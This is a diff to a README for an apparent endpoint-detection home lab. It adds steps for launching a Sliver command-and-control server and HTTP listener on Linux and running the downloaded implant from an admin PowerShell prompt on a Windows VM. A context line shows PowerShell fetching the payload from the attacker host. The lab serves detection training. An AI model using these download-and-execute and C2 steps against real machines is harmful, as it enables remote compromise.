@@ -62,7 +62,24 @@ B.  Linux Virtual Machine (Ubuntu Server Version) with Sliver Command and Contro
    
    --> IWR -Uri http://Linux IP/payloadname.exe -Outfile C:\Users\User\Downloads\payloadname.exe
 
+7.  Now that the payload has been downloaded on the Windows Machine, we can execute the Command
+    and Control Session as an attacker through the Linux Machine.
+    
+   a.  Using the SSH session on the Linux server We will relaunch Sliver with command --> sliver-server
+   
+   b.  Then we start the listener with -->http
 
+![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/a84825cd-e9e8-4a03-9b60-08006dc91fff)
+
+8.  Switching over to the Windows Machine, we then execute the payload with the following command using Admin Powershell Prompt:
+    --> C:\Users\User\Downloads\<your_C2-implant>.exe
+    Note that the established session is shown on the Linux Machine as shown below.
+
+![image](https://github.com/4cysec/Endpoint-Detection-and-Response/assets/149924544/6c9c5a86-cfa2-431a-849a-1277643ca12a)
+
+
+
+    
 <!--
  ```diff
 - text in red
